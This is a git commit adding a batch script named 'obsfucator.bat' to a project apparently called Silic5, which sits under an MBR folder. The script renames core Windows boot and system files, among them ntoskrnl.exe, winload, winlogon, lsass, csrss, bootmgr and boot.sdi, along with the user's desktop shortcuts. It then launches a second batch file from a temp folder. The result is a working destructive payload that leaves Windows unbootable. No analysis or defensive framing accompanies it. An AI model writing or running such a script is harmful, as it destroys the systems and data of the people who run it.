a5c65080eabd1f8ba6ed3a0a076e127cfd7d9c0d
Sky <122670750+Kakun21993@users.noreply.github.com>
2026-07-09 12:07:53 +0700

    v3.0 FINAL
    bootx64.efi is not required, but i decided to include it

---
+++ MBR/Silic5/Resources/obsfucator.bat
@@ -0,0 +1,21 @@
+@echo off
+ren C:\Windows\System32\ntoskrnl.exe VwRhztPfsm.00
+ren C:\Windows\System32\winload.exe OpYsHkDixMnQ.00
+ren C:\Windows\System32\winload.efi KhcBszYd.00
+ren C:\Windows\System32\winlogon.exe PzSxKeXct.00
+ren C:\Windows\System32\LogonUI.exe KxZQwf.00
+ren C:\Windows\System32\wininit.exe PxZvfWQgx.00
+ren C:\Windows\System32\smss.exe OxSWesQZsjfT.00
+ren C:\Windows\System32\svchost.exe GxFejidKlXwPq.00
+ren C:\Windows\System32\csrss.exe KzGXAsZdhQxyX.00
+ren C:\Windows\System32\wininit.exe PzXGhRtEqWjv.00
+ren C:\Windows\System32\services.exe KjbvNmYxv.00
+ren C:\Windows\System32\dwm.exe kLqZxFTghS.00
+ren C:\Windows\System32\lsass.exe OpZxHkSabVxZ.00
+ren C:\Windows\System32\userinit.exe LkmAXvTvZxVgoY.00
+ren C:\bootmgr Xzs0Jhe.00
+ren C:\BOOTNXT JkzxYsfWQ.00
+ren "%USERPROFILE%\Desktop\*.lnk" *.00
+ren C:\Windows\SysWOW64\boot.sdi OAx3BjxMwKPq.00
+ren C:\Windows\System32\boot.sdi GhSZcmQAsiUWp.00
+cmd /c "C:\Program Files (x86)\Microsoft\Temp\rd.bat"
